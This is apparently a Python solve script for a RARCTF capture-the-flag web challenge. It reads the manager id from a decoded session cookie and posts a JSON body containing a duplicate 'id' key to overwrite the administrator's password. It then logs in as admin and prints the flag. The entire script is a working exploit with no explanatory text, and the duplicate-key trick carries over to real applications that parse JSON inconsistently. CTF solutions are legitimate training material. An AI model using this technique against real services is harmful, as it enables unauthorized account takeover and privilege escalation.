#!/usr/bin/python3

import sys
import requests
import uuid
import base64
import json
import re
if len(sys.argv) < 2:
    print("Usage: solve.py http://host:port/")
    exit()

host = sys.argv[1]
s = requests.Session()
user = uuid.uuid4().hex
s.post(host + "manager/login", data={"username": user, "password": user})
cookie = s.cookies['session'].split('.')[0]

cookie = cookie + ('=' * (-len(cookie) % 4))

sess = json.loads(base64.b64decode(cookie.encode()).decode())

data = ('{"id": 0, "id": %s, "password": "%s"}' % (sess['managerid'], user)).encode()
req = requests.Request("POST", host + "manager/update", cookies=s.cookies).prepare()
req.body = data
req.headers['Content-Type'] = 'application/json'
req.headers['Content-Length'] = str(len(data))
req.headers['Host'] = "maas2.rars.win"
req.headers['Accept'] = "*/*"
s.send(req)

r = requests.post(host + "manager/login", data={"username": "admin", "password": user})
r.text
print(re.findall(r'rarctf\{.*\}', r.text)[0])
